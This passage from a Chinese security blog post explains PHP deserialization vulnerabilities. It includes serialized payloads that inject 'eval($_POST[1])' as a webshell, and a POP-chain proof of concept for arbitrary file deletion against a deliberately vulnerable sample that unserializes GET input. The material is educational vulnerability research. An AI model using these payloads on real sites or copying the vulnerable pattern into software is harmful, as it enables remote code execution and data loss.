+O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"%00*%00test"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"%00C%00data"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"%00*%00test"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"%00C%00data"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token string">"eval($_POST[1]);"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
+<p>使用上述序列化字节序列作为参数进行传递，操作结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/unserialize/php_vuln/同名方法私有属性反序列导致命令执行.png" alt="同名方法私有属性反序列导致命令执行"></center>
+
+
+
+<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><h3 id="产生条件-2"><a href="#产生条件-2" class="headerlink" title="产生条件"></a>产生条件</h3><ul>
+<li>反序列化对象的属性值可控；</li>
+<li>触发魔术方法时将属性值带入并执行文件删除操作。</li>
+</ul>
+<h3 id="代码示例-3"><a href="#代码示例-3" class="headerlink" title="代码示例"></a>代码示例</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">B</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$cache_file</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function">Delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"C:/test/{$this->cache_file}"</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+            @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">return</span> <span class="token string">'I am a evil Delete function'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">C</span>
+<span class="token punctuation">{</span>
+
+    <span class="token keyword">function</span> <span class="token function">Delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+
+        <span class="token keyword">return</span> <span class="token string">'I am a safe Delete function'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$user_data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token variable">$user_data</span><span class="token punctuation">;</span>
+</code></pre>
+<h3 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h3><p>通过分析上述源码，构造POP链为：</p>
+<p><code>A类→__construct()→$this-&gt;obj=new B→__tostring()→B.Delete方法</code></p>
+<p>此POP链的构造就是通过反序列化和<code>echo</code>来触发<code>__tostring()</code>魔术方法，并且此方法中调用B中的<code>Delete()</code>方法，造成任意文件删除的危害。</p>
+<p>使用如下POC生成序列化串，操作如下所示。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">obj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">B</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$cache_file</span> <span class="token operator">=</span> <span class="token string">'1.txt'</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function">Delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"C:/test/{$this->cache_file}"</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+            <span class="token comment" spellcheck="true">// @unlink($file);</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">return</span> <span class="token string">'I am a evil Delete function'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">C</span>
+<span class="token punctuation">{</span>
+
+    <span class="token keyword">function</span> <span class="token function">Delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+
+        <span class="token keyword">return</span> <span class="token string">'I am a safe Delete function'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// 输出</span>
+O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"%00*%00obj"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"cache_file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"1.txt"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span class="token comment" spellcheck="true">// 1.txt可任意修改使用相对路径达到任意文件删除</span></code></pre>
+<p>将上述序列化串作为参数进行传递，操作结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/unserialize/php_vuln/同名函数反序列化导致任意文件删除.png" alt="同名函数反序列化导致任意文件删除"></center>
+
+
+
+
+
+
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a href="https://xz.aliyun.com/t/6753" target="_blank" rel="noopener">一文让PHP反序列化从入门到进阶 - 先知社区</a></li>
+<li><a href="https://xz.aliyun.com/t/9234" target="_blank" rel="noopener">反序列化漏洞详解 - 先知社区</a></li>
+</ul>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://www.z1r0s.top" rel="external nofollow noreferrer">z1r0s</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://www.z1r0s.top/2021/03/16/security/webvuln/unserialize/php-fan-xu-lie-hua/">https://www.z1r0s.top/2021/03/16/security/webvuln/unserialize/php-fan-xu-lie-hua/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://www.z1r0s.top" target="_blank">z1r0s</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/反序列化/">
+                                    <span class="chip bg-color">反序列化</span>
+                                </a>
+                            
+                                <a href="/tags/PHP/">
+                                    <span class="chip bg-color">PHP</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .mvaline-card {
+        margin: 1.5rem auto;
+    }
+
+    .mvaline-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+</style>
+
+<div class="card mvaline-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="mvcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/minivaline/MiniValine.js"></script>
+<script>
+    new MiniValine(Object.assign({"enable":true,"appId":"rr4jTLi2BJEgTziWjmGxpu1a-MdYXbMMI","appKey":"aFRDmu52XNOUP0PyGNjjzDCQ","mode":"DesertsP","placeholder":"Write a Comment","math":true,"md":true,"enableQQ":false,"NoRecordIP":false,"visitor":true,"maxNest":6,"pageSize":6,"adminEmailMd5":"de8a7aa53d07e6b6bceb45c64027763d","tagMeta":["管理员","小伙伴","访客"],"master":["de8a7aa53d07e6b6bceb45c64027763d"],"friends":["b5bd5d836c7a0091aa8473e79ed4c25e","adb7d1cd192658a55c0ad22a3309cecf","3ce1e6c77b4910f1871106cb30dc62b0","cfce8dc43725cc14ffcd9fb4892d5bfc"],"lang":null,"emoticonUrl":["https://cdn.jsdelivr.net/npm/alus@latest","https://cdn.jsdelivr.net/gh/MiniValine/qq@latest","https://cdn.jsdelivr.net/gh/MiniValine/Bilibilis@latest","https://cdn.jsdelivr.net/gh/MiniValine/tieba@latest","https://cdn.jsdelivr.net/gh/MiniValine/twemoji@latest","https://cdn.jsdelivr.net/gh/MiniValine/weibo@latest"]}, {
+	  el: '#mvcomments',
+    }));
+</script>
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/03/16/security/webvuln/unserialize/php-fan-xu-lie-hua/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/131.jpg" class="responsive-img" alt="PHP反序列化">
+                        
+                        <span class="card-title">PHP反序列化</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Security/" class="post-category">
+                                    Security
+                                </a>
+                            
+                            <a href="/categories/Security/Web/" class="post-category">
+                                    Web
+                                </a>
+                            
+                            <a href="/categories/Security/Web/反序列化/" class="post-category">
+                                    反序列化
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/反序列化/">
+                        <span class="chip bg-color">反序列化</span>
+                    </a>
+                    
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/03/15/security/webvuln/xxe/xxe/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/243.jpg" class="responsive-img" alt="XXE">
+                        
+                        <span class="card-title">XXE</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Security/" class="post-category">
+                                    Security
+                                </a>
+                            
+                            <a href="/categories/Security/Web/" class="post-category">
+                                    Web
+                                </a>
+                            
+                            <a href="/categories/Security/Web/XXE/" class="post-category">
+                                    XXE
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/XXE/">
+                        <span class="chip bg-color">XXE</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
+    });
+</script>
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="tencent"
+                   type="playlist"
+                   id="7173532278"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2020-2021</span>
+            
+            <span id="year">2020</span>
+            <a href="/about" target="_blank">z1r0s</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">304.8k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/z1r0s" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:2603350388@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2603350388" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2603350388" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
